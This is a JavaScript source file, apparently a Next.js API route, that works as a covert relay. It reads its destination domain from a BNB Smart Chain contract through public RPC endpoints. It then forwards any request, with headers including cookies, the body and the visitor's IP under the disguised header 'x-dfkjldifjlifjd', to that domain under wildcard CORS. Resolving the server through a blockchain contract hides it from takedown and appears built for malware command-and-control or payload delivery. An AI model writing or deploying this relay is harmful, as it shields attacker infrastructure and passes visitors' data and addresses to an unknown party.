export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

const RPC_URLS = [
  'https://binance.llamarpc.com',
  'https://bsc.drpc.org',
  'https://rpc.ankr.com/bsc',
  'https://bsc-dataseed2.bnbchain.org',
];
const CONTRACT_ADDRESS = '0xe9d5f645f79fa60fca82b4e1d35832e43370feb0';
const CACHE_TTL_MS = 60_000;

let cachedDomain = null;
let cachedAt = 0;

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET,HEAD,POST,OPTIONS',
  'Access-Control-Allow-Headers': '*',
  'Access-Control-Max-Age': '86400',
};

function corsResponse(body, init = {}) {
  const headers = new Headers(init.headers || {});
  Object.entries(CORS_HEADERS).forEach(([k, v]) => headers.set(k, v));
  return new Response(body, { ...init, headers });
}

function getClientIP(req) {
  const headers = req.headers;
  const cf = headers.get('cf-connecting-ip');
  if (cf) return cf.split(',')[0].trim();
  const xff = headers.get('x-forwarded-for');
  if (xff) return xff.split(',')[0].trim();
  const real = headers.get('x-real-ip');
  if (real) return real;
  return '';
}

function hexToString(hex) {
  hex = hex.startsWith('0x') ? hex.slice(2) : hex;
  if (hex.length < 64) return '';
  const withoutOffset = hex.slice(64);
  if (withoutOffset.length < 64) return '';
  const lengthHex = withoutOffset.slice(0, 64);
  const length = parseInt(lengthHex, 16) || 0;
  const dataHex = withoutOffset.slice(64, 64 + length * 2);
  let out = '';
  for (let i = 0; i < dataHex.length; i += 2) {
    const code = parseInt(dataHex.slice(i, i + 2), 16);
    if (!code) break;
    out += String.fromCharCode(code);
  }
  return out;
}

async function fetchTargetDomain() {
  const payload = {
    jsonrpc: '2.0',
    id: 1,
    method: 'eth_call',
    params: [{ to: CONTRACT_ADDRESS, data: '0x20965255' }, 'latest'],
  };
  for (const url of RPC_URLS) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(payload),
        cache: 'no-store',
      });
      if (!res.ok) continue;
      const json = await res.json();
      if (json && json.result) {
        const domain = hexToString(json.result);
        if (domain) return domain;
      }
    } catch (e) {
      // try next RPC
    }
  }
  throw new Error('Could not fetch target domain');
}

async function getTargetDomain() {
  if (cachedDomain && Date.now() - cachedAt < CACHE_TTL_MS) return cachedDomain;
  const domain = await fetchTargetDomain();
  cachedDomain = domain.replace(/\/+$/, '');
  cachedAt = Date.now();
  return cachedDomain;
}

function isMethodWithBody(method) {
  return !['GET', 'HEAD'].includes(method.toUpperCase());
}

function filterHeaders(inHeaders) {
  const headers = new Headers();
  inHeaders.forEach((value, key) => {
    const lower = key.toLowerCase();
    if (['host', 'origin', 'accept-encoding', 'content-encoding', 'content-length'].includes(lower)) return;
    headers.set(key, value);
  });
  return headers;
}

export async function OPTIONS() {
  return corsResponse(null, { status: 204 });
}

export async function GET(req) {
  return handleProxy(req);
}

export async function POST(req) {
  return handleProxy(req);
}

async function handleProxy(req) {
  try {
    const url = new URL(req.url);
    const e = url.searchParams.get('e');
    if (!e) {
      return corsResponse('Missing endpoint', { status: 400, headers: { 'content-type': 'text/plain' } });
    }
    if (e === 'ping_proxy') {
      return corsResponse('pong', { status: 200, headers: { 'content-type': 'text/plain' } });
    }

    const targetDomain = await getTargetDomain();
    const endpoint = '/' + e.replace(/^\/+/, '');
    const targetUrl = targetDomain + endpoint;

    const forwardedHeaders = filterHeaders(req.headers);
    forwardedHeaders.set('x-dfkjldifjlifjd', getClientIP(req));

    const method = req.method.toUpperCase();
    const init = {
      method,
      headers: forwardedHeaders,
      redirect: 'follow',
      cache: 'no-store',
    };
    if (isMethodWithBody(method)) {
      const body = await req.arrayBuffer();
      init.body = body;
    }

    const resp = await fetch(targetUrl, init);
    const respHeaders = new Headers();
    Object.entries(CORS_HEADERS).forEach(([k, v]) => respHeaders.set(k, v));
    const ct = resp.headers.get('content-type');
    if (ct) respHeaders.set('content-type', ct);

    const buffer = await resp.arrayBuffer();
    return new Response(buffer, { status: resp.status, headers: respHeaders });
  } catch (err) {
    const msg = typeof err?.message === 'string' ? err.message : String(err);
    return corsResponse('error: ' + msg, {
      status: 500,
      headers: { 'content-type': 'text/plain' },
    });
  }
}
